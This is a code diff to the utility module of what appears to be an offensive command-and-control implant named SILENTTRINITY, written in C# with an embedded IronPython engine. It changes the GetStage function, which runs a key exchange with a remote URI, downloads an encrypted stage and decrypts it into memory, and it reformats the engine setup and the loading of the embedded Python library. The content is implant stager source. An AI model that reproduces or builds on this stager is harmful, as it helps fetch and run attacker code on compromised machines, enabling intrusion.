@@ -8,8 +8,6 @@ using System.Collections.Generic;
 using System.IO;
 using System.Text;
 using System.IO.Compression;
-using System.Threading.Tasks;
-using System.Threading;
 
 namespace SILENTTRINITY.Utilities
 {
@@ -43,22 +41,9 @@ namespace SILENTTRINITY.Utilities
 
             public static MemoryStream GetStage(Uri uri)
             {
-                do
-                {
-                    try
-                    {
-                        var key = Crypto.KeyExchange(uri);
-                        var stage = Crypto.Decrypt(key, Http.Get(uri));
-                        return new MemoryStream(stage);
-                    }
-                    catch 
-                    {
-                        Thread.Sleep(5000);
-#if DEBUG
-                        Console.WriteLine("Retrying key exchange...");
-#endif
-                    }
-                } while (true);
+                var key = Crypto.Base.KeyExchange(uri);
+                var stage = Crypto.Base.Decrypt(key, Http.Get(uri));
+                return new MemoryStream(stage);
             }
 
             // https://mail.python.org/pipermail/ironpython-users/2012-December/016366.html
@@ -66,12 +51,11 @@ namespace SILENTTRINITY.Utilities
             // https://blog.adamfurmanek.pl/2017/10/14/sqlxd-part-22/
             public static dynamic CreateEngine()
             {
-                var options = new Dictionary<string, object>
-                {
-                    ["Debug"] = false
-                };
-
-                ScriptRuntimeSetup setup = Python.CreateRuntimeSetup(options);
+                ScriptRuntimeSetup setup = Python.CreateRuntimeSetup(
+                                                new Dictionary<string, object>
+                                                    {
+                                                        ["Debug"] = false
+                                                    });
                 var pyRuntime = new ScriptRuntime(setup);
                 ScriptEngine engineInstance = Python.GetEngine(pyRuntime);
 
@@ -83,26 +67,28 @@ namespace SILENTTRINITY.Utilities
             public static void AddPythonLibrariesToSysMetaPath(ScriptEngine engineInstance)
             {
                 Assembly asm = Assembly.GetExecutingAssembly().GetType().Assembly;
+
                 try
                 {
-                    var resQuery =
-                        from name in asm.GetManifestResourceNames()
+                    var resQuery = from name in asm.GetManifestResourceNames()
                         where name.EndsWith(".zip", StringComparison.OrdinalIgnoreCase)
-                        select name;
+                            select name;
                     string resName = resQuery.Single();
 
 #if DEBUG
-                    Console.WriteLine("Found embedded IPY stdlib : {0}", resName);
+                    Console.WriteLine("\t[+] Found embedded IPY stdlib: {0}", resName);
 #endif
+
                     var importer = new ResourceMetaPathImporter(asm, resName);
                     dynamic sys = engineInstance.GetSysModule();
+
                     sys.meta_path.append(importer);
                     sys.path.append(importer);
                 }
                 catch (Exception e)
                 {
 #if DEBUG
-                    Console.WriteLine("Did not find IPY stdlib in embedded resources: {0}", e.Message);
+                    Console.WriteLine("\t[-] Did not find IPY stdlib in embedded resources: {0}", e.Message);
 #endif
                     return;
                 }
